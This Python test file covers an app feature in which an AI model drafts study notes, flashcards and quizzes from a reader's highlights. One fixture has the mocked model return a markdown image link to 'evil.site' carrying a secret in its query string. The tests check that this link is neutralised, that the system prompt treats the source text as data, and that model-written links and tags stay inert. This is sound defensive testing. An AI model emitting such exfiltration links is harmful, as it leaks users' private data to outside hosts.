"""Study notes writer (AI plan, milestone 2.4): notes, flashcards or a short quiz drafted from your highlights or a
section. Every item must rest on a quote that is in the text sent; nothing is saved until you accept it; what you
keep stays labelled as written by the model. No test reaches a real server (see conftest)."""
import json

import httpx

from readhold.ai import prompts
from tests.conftest import SAMPLE_MD
from tests.test_ai import LOCAL

SMR = "The SMR is a gating network over token blocks."
COMPUTE = "SMR reduces compute by 41% on long inputs."


def _doc(client, text=SAMPLE_MD):
    r = client.post("/api/import/text", json={"title": "", "text": text, "format": "markdown"})
    assert r.status_code == 200, r.text
    return r.json()


def _ords(client, doc_id):
    full = client.get(f"/api/documents/{doc_id}").json()
    return {s["text"]: (s["ord"], sec["id"], sec["title"]) for sec in full["sections"] for p in sec["paragraphs"] for s in p["sentences"]}


def _highlight(client, doc_id, ord_, kind="claim", note=""):
    r = client.post("/api/highlights", json={"document_id": doc_id, "sentence": ord_, "end_sentence": ord_, "type": kind, "note": note})
    assert r.status_code == 200, r.text


def items(*rows):
    return {"items": [{"text": t, "answer": a, "anchor": "", "quote": q} for t, a, q in rows]}


class Model:
    def __init__(self, reply=None):
        self.reply = reply or items(("SMR is a gating network.", "A gating network.", SMR), ("It saves compute.", "41% less.", COMPUTE))
        self.requests: list[dict] = []

    def __call__(self, request):
        body = json.loads(request.content)
        self.requests.append(body)
        out = self.reply(body) if callable(self.reply) else self.reply
        content = out if isinstance(out, str) else json.dumps(out)
        return httpx.Response(200, json={"message": {"role": "assistant", "content": content}, "prompt_eval_count": 10, "eval_count": 10})

    def user(self, i=-1):
        return self.requests[i]["messages"][-1]["content"]

    def system(self, i=-1):
        return self.requests[i]["messages"][0]["content"]


def _model(client, model):
    client.app.state.ai.transport = httpx.MockTransport(model)
    client.app.state.ai.retry_wait = 0
    client.put("/api/settings", json=LOCAL)
    return model


def _write(client, doc_id, **kw):
    return client.post(f"/api/documents/{doc_id}/study-notes", json={"source": "highlights", "kind": "notes", **kw})


def _setup(client):
    doc = _doc(client)
    by = _ords(client, doc["id"])
    _highlight(client, doc["id"], by[SMR][0], "definition", note="my own remark on SMR")
    _highlight(client, doc["id"], by[COMPUTE][0], "claim")
    return doc, by


# ------------------------------------------------------------------ the request
def test_with_ai_off_nothing_is_sent(client):
    doc, _ = _setup(client)
    model = Model()
    client.app.state.ai.transport = httpx.MockTransport(model)
    r = _write(client, doc["id"])
    assert r.status_code == 409 and "off" in r.json()["detail"].lower() and model.requests == []


def test_no_highlights_means_nothing_to_write_from(client):
    doc = _doc(client)
    model = _model(client, Model())
    r = _write(client, doc["id"])
    assert r.status_code == 409 and "highlight" in r.json()["detail"].lower() and model.requests == []
    assert client.post(f"/api/documents/{doc['id']}/study-notes", json={"source": "everything", "kind": "notes"}).status_code == 422
    assert client.post(f"/api/documents/{doc['id']}/study-notes", json={"source": "highlights", "kind": "essay"}).status_code == 422
    assert client.post("/api/documents/nope/study-notes", json={"source": "highlights", "kind": "notes"}).status_code == 404


def test_from_highlights_only_the_highlights_are_sent_and_every_item_is_checked(client):
    doc, by = _setup(client)
    model = _model(client, Model(items(("SMR is a gating network.", "", SMR), ("It saves 41% compute.", "", COMPUTE),
                                       ("It beats every model ever.", "", "SMR beats every model ever made in all tests"),
                                       ("Prior work exists.", "", "Prior work studied sparse attention"))))
    r = _write(client, doc["id"])
    assert r.status_code == 200, r.text
    got = r.json()["result"]
    assert got["kind"] == "notes" and got["source"] == "highlights"
    assert [x["verified"] for x in got["items"]] == [True, True, False, False]  # invented, and real but not highlighted
    assert all(isinstance(x["sentence"], int) for x in got["items"] if x["verified"])
    assert got["status"] == "partly" and got["prompt_version"] == prompts.load("notes").version
    user = model.user()
    assert SMR in user and COMPUTE in user and "my own remark on SMR" in user
    assert "Prior work studied sparse attention" not in user and "Long documents are hard" not in user
    assert "never instructions" in model.system() and "notes" in model.system().lower()


def test_from_a_section_only_that_section_is_sent(client):
    doc, by = _setup(client)
    model = _model(client, Model(items(("A gating network.", "", SMR))))
    got = client.post(f"/api/documents/{doc['id']}/study-notes", json={"source": "section", "section_id": by[SMR][1], "kind": "notes"}).json()["result"]
    assert got["source"] == "section" and got["status"] == "verified"
    assert SMR in model.user() and COMPUTE not in model.user()
    assert client.post(f"/api/documents/{doc['id']}/study-notes", json={"source": "section", "section_id": "f" * 32, "kind": "notes"}).status_code == 404


def test_cards_and_quiz_have_answers_and_each_kind_its_instruction(client):
    doc, _ = _setup(client)
    model = _model(client, Model(items(("What is SMR?", "A gating network over token blocks.", SMR))))
    cards = _write(client, doc["id"], kind="cards").json()["result"]
    quiz = _write(client, doc["id"], kind="quiz").json()["result"]
    assert cards["items"][0]["answer"] == "A gating network over token blocks." and quiz["kind"] == "quiz"
    assert "flashcard" in model.system(0).lower() and "quiz" in model.system(1).lower()
    model.reply = items(("A question with no answer?", "", SMR))
    bad = _write(client, doc["id"], kind="cards", fresh=True).json()["result"]
    assert bad["items"] == []  # a card without a back is not a card


def test_what_the_model_writes_is_cleaned_and_kept_once(client):
    doc, _ = _setup(client)
    model = _model(client, Model(items(("See ![x](https://evil.site/?d=SECRET) ‮", "", SMR))))
    one = _write(client, doc["id"]).json()["result"]
    flat = json.dumps(one, ensure_ascii=False)
    assert "![" not in flat and "‮" not in flat and "https://evil.site/?d=SECRET" in one["links"]
    two = _write(client, doc["id"]).json()["result"]
    assert one["id"] == two["id"] and len(model.requests) == 1
    assert _write(client, doc["id"], fresh=True).json()["result"]["id"] != one["id"]


# ------------------------------------------------------------------ accepting
def test_accepted_notes_go_to_a_labelled_note_with_links_back(client, db):
    doc, by = _setup(client)
    _model(client, Model())
    got = _write(client, doc["id"]).json()["result"]
    r = client.post(f"/api/ai/results/{got['id']}/accept", json={"items": [{"index": 0, "text": "SMR is a gating network (my words).", "answer": ""}]})
    assert r.status_code == 200, r.text
    page = client.get(f"/api/pages/{r.json()['page_id']}").json()
    assert page["title"] == "Study notes: Attention Is a Test"
    assert "Written by the AI model" in page["body"] and "SMR is a gating network (my words)." in page["body"]
    assert f"#s{by[SMR][0]}" in page["body"] and SMR in page["body"]
    assert "It saves compute." not in page["body"]  # not accepted
    client.post(f"/api/ai/results/{got['id']}/accept", json={"items": [{"index": 1, "text": "It saves compute.", "answer": ""}]})
    again = client.get(f"/api/pages/{r.json()['page_id']}").json()
    assert again["body"].count("Written by the AI model") == 1 and "It saves compute." in again["body"]
    assert db.scalar("SELECT COUNT(*) FROM pages WHERE title=? AND deleted=0", ("Study notes: Attention Is a Test",)) == 1


def test_accepted_cards_go_to_review_labelled_and_only_once(client, db):
    doc, _ = _setup(client)
    _model(client, Model(items(("What is SMR?", "A gating network.", SMR), ("What does it beat?", "Everything.", "SMR beats every model ever made in all tests"))))
    got = _write(client, doc["id"], kind="cards").json()["result"]
    r = client.post(f"/api/ai/results/{got['id']}/accept", json={"items": [{"index": 0, "text": "What is SMR?", "answer": "A gating network."}]})
    assert r.status_code == 200 and r.json()["cards"] == 1
    client.post(f"/api/ai/results/{got['id']}/accept", json={"items": [{"index": 0, "text": "What is SMR?", "answer": "A gating network."}]})
    rows = db.all("SELECT * FROM cards WHERE source_type='ai' AND deleted=0")
    assert len(rows) == 1 and rows[0]["front"] == "What is SMR?" and rows[0]["document_id"] == doc["id"]
    due = client.get("/api/review/due").json()["cards"]
    assert any(c["source_type"] == "ai" for c in due)
    # an item whose quote is not in the text cannot be kept
    r = client.post(f"/api/ai/results/{got['id']}/accept", json={"items": [{"index": 1, "text": "What does it beat?", "answer": "Everything."}]})
    assert r.status_code == 409 and "checked" in r.json()["detail"]


def test_accept_is_checked(client):
    doc, _ = _setup(client)
    _model(client, Model())
    got = _write(client, doc["id"]).json()["result"]
    url = f"/api/ai/results/{got['id']}/accept"
    assert client.post(url, json={"items": []}).status_code == 409  # the same code as the write route's "cannot"
    assert client.post(url, json={"items": [{"index": 9, "text": "x", "answer": ""}]}).status_code == 409
    assert client.post(url, json={"items": [{"index": 0, "text": "   ", "answer": ""}]}).status_code == 409
    assert client.post(url, json={"items": [{"index": "x", "text": "x", "answer": ""}]}).status_code == 422  # malformed
    assert client.post("/api/ai/results/" + "0" * 32 + "/accept", json={"items": [{"index": 0, "text": "x", "answer": ""}]}).status_code == 404
    quiz = _write(client, doc["id"], kind="quiz").json()["result"]
    r = client.post(f"/api/ai/results/{quiz['id']}/accept", json={"items": [{"index": 0, "text": "Q?", "answer": "A."}], "keep_as": "cards"})
    assert r.status_code == 200 and r.json()["cards"] == 1  # a quiz question can be kept as a card


def test_clear_ai_history_keeps_what_you_accepted(client, db):
    doc, _ = _setup(client)
    _model(client, Model())
    got = _write(client, doc["id"]).json()["result"]
    page_id = client.post(f"/api/ai/results/{got['id']}/accept", json={"items": [{"index": 0, "text": "Kept.", "answer": ""}]}).json()["page_id"]
    client.delete("/api/ai/log")
    assert db.scalar("SELECT COUNT(*) FROM ai_results") == 0
    assert "Kept." in client.get(f"/api/pages/{page_id}").json()["body"]


# ------------------------------------------------------------------ found in review
def _accept(client, rid, *rows, **kw):
    return client.post(f"/api/ai/results/{rid}/accept", json={"items": [{"index": i, "text": t, "answer": a} for i, t, a in rows], **kw})


def test_a_quote_from_text_that_was_not_sent_is_not_verified(client):
    """Many long highlights are cut to fit the budget; a quote from a cut-off end was never seen by the model."""
    paras = [f"Paragraph {i} " + "word " * 110 + f"ends with tail marker number {i} here." for i in range(45)]
    doc = _doc(client, "# Long highlights\n\n" + "\n\n".join(paras))
    by = _ords(client, doc["id"])
    for text in by:
        if text.startswith("Paragraph"):
            _highlight(client, doc["id"], by[text][0])
    model = _model(client, Model(items(("A head.", "", "Paragraph 3 word word word word"), ("A tail.", "", "ends with tail marker number 3 here"))))
    got = _write(client, doc["id"]).json()["result"]
    assert "ends with tail marker number 3 here" not in model.user()
    assert [x["verified"] for x in got["items"]] == [True, False]
    assert got["cut"] is True and got["left_out"] == 5  # 45 highlights, the first 40 sent, and each one shortened


def test_the_kept_quote_is_the_documents_own_words_and_model_markup_stays_inert(client, db):
    from readhold import pages
    doc, by = _setup(client)
    _model(client, Model(items(("SMR is like [[Secret plan]] #urgent", "", "The SMR is a [[gating]] network: #over token, blocks"),
                               ("It saves compute.", "", COMPUTE))))
    got = _write(client, doc["id"]).json()["result"]
    assert got["items"][0]["verified"] and got["items"][0]["quote"] == SMR  # shown as the passage says it, not as the model wrote it
    r = _accept(client, got["id"], (0, "SMR is like [[Secret plan]] #urgent", ""), (1, "It saves compute, see [[My own page]] #mine", ""))
    body = client.get(f"/api/pages/{r.json()['page_id']}").json()["body"]
    assert "secret plan" not in pages.links_in(body) and "gating" not in pages.links_in(body)
    assert "urgent" not in pages.tags_in(body) and "over" not in pages.tags_in(body)
    assert "my own page" in pages.links_in(body) and "mine" in pages.tags_in(body)  # what you typed yourself works as usual
    assert "Secret plan" in body and SMR in body


def test_keeping_twice_keeps_one_copy(client, db):
    doc, _ = _setup(client)
    _model(client, Model())
    got = _write(client, doc["id"]).json()["result"]
    r = _accept(client, got["id"], (0, "SMR is a gating network.", ""), (0, "SMR is a gating network.", ""))
    _accept(client, got["id"], (0, "SMR is a gating network.", ""))
    body = client.get(f"/api/pages/{r.json()['page_id']}").json()["body"]
    assert body.count("SMR is a gating network.") == 1
    again = _write(client, doc["id"]).json()["result"]
    assert again["kept"] == [0]  # reopening shows what was already kept
    cards = _write(client, doc["id"], kind="cards").json()["result"]
    assert _accept(client, cards["id"], (0, "SMR is a gating network.", "A gating network.")).json()["cards"] == 1
    fresh = _write(client, doc["id"], kind="cards", fresh=True).json()["result"]
    out = _accept(client, fresh["id"], (0, "SMR is  a gating network.", "Another answer.")).json()
    assert out["cards"] == 0 and out["skipped"] == 1  # the same question from "Ask again" is not a second card
    assert db.scalar("SELECT COUNT(*) FROM cards WHERE source_type='ai'") == 1


def test_a_card_you_deleted_stays_deleted(client, db):
    doc, _ = _setup(client)
    _model(client, Model())
    got = _write(client, doc["id"], kind="cards").json()["result"]
    _accept(client, got["id"], (0, "What is SMR?", "A gating network."))
    card = db.one("SELECT * FROM cards WHERE source_type='ai'")
    db.soft_delete("cards", card["id"])
    out = _accept(client, got["id"], (0, "What is SMR now?", "Something else.")).json()
    after = db.one("SELECT * FROM cards WHERE id=?", (card["id"],))
    assert out["cards"] == 0 and after["deleted"] == 1 and after["front"] == "What is SMR?"


def test_each_kept_batch_carries_its_own_label_and_cards_their_passage(client, db):
    doc, _ = _setup(client)
    _model(client, Model())
    got = _write(client, doc["id"]).json()["result"]
    pid = _accept(client, got["id"], (0, "First.", "")).json()["page_id"]
    client.patch(f"/api/pages/{pid}", json={"body": "My own words now."})
    _accept(client, got["id"], (1, "Second.", ""))
    body = client.get(f"/api/pages/{pid}").json()["body"]
    assert body.startswith("My own words now.") and body.count("Written by the AI model") == 1
    assert body.index("Written by the AI model") < body.index("Second.")
    cards = _write(client, doc["id"], kind="cards").json()["result"]
    _accept(client, cards["id"], (0, "What is SMR?", "A gating network."))
    back = db.scalar("SELECT back FROM cards WHERE source_type='ai'")
    assert back.startswith("A gating network.") and SMR in back  # Review shows the passage to check it against


def test_documents_with_the_same_title_get_their_own_note(client):
    one, _ = _setup(client)
    two = _doc(client)
    by2 = _ords(client, two["id"])
    _highlight(client, two["id"], by2[SMR][0])
    _model(client, Model())
    a = _accept(client, _write(client, one["id"]).json()["result"]["id"], (0, "One.", "")).json()
    b = _accept(client, _write(client, two["id"]).json()["result"]["id"], (0, "Two.", "")).json()
    assert a["page_id"] != b["page_id"] and a["title"] != b["title"]
    body = client.get(f"/api/pages/{b['page_id']}").json()["body"]
    assert "[[Attention Is a Test#" not in body  # a link by title could open the other document


def test_a_long_section_is_sent_around_where_you_are_and_says_so(client):
    sents = [f"Sentence number {i} talks about widgets and gears in some detail here." for i in range(600)]
    paras = [" ".join(sents[i:i + 10]) for i in range(0, 600, 10)]
    doc = _doc(client, "# Long\n\n## One long section\n\n" + "\n\n".join(paras))
    by = _ords(client, doc["id"])
    last = sents[-1]
    model = _model(client, Model(items(("The end.", "", last))))
    got = client.post(f"/api/documents/{doc['id']}/study-notes", json={"source": "section", "section_id": by[last][1], "kind": "notes", "at": by[last][0]}).json()["result"]
    assert last in model.user() and got["items"][0]["verified"] and got["cut"] is True


# ------------------------------------------------------------------ found while writing the 2.4 docs
def test_no_empty_label_when_nothing_new_is_kept(client):
    doc, _ = _setup(client)
    _model(client, Model())
    got = _write(client, doc["id"]).json()["result"]
    pid = _accept(client, got["id"], (0, "SMR is a gating network.", "")).json()["page_id"]
    body = client.get(f"/api/pages/{pid}").json()["body"]
    client.patch(f"/api/pages/{pid}", json={"body": body + "\nMy own line below.\n"})
    fresh = _write(client, doc["id"], fresh=True).json()["result"]
    _accept(client, fresh["id"], (0, "SMR is a gating network.", ""))  # the same line again: nothing to add
    assert client.get(f"/api/pages/{pid}").json()["body"].count("Written by the AI model") == 1


def test_same_title_is_seen_beyond_ascii_and_spacing(client):
    one = _doc(client, SAMPLE_MD.replace("Attention Is a Test", "Über  Attention"))
    two = _doc(client, SAMPLE_MD.replace("Attention Is a Test", "über attention"))
    _model(client, Model())
    for d in (one, two):
        _highlight(client, d["id"], _ords(client, d["id"])[SMR][0])
    a = _accept(client, _write(client, one["id"]).json()["result"]["id"], (0, "One.", "")).json()
    b = _accept(client, _write(client, two["id"]).json()["result"]["id"], (0, "Two.", "")).json()
    assert a["page_id"] != b["page_id"]
    assert "[[" not in client.get(f"/api/pages/{a['page_id']}").json()["body"].split("—")[-1]


def test_model_markup_stays_inert_after_a_small_edit(client):
    from readhold import pages
    doc, _ = _setup(client)
    _model(client, Model(items(("SMR is like [[Secret plan]] #urgent", "", SMR))))
    got = _write(client, doc["id"]).json()["result"]
    r = _accept(client, got["id"], (0, "SMR is much like [[Secret plan]] #urgent, see [[My page]]", ""))
    body = client.get(f"/api/pages/{r.json()['page_id']}").json()["body"]
    assert "secret plan" not in pages.links_in(body) and "urgent" not in pages.tags_in(body)
    assert "my page" in pages.links_in(body)  # the link you added yourself works
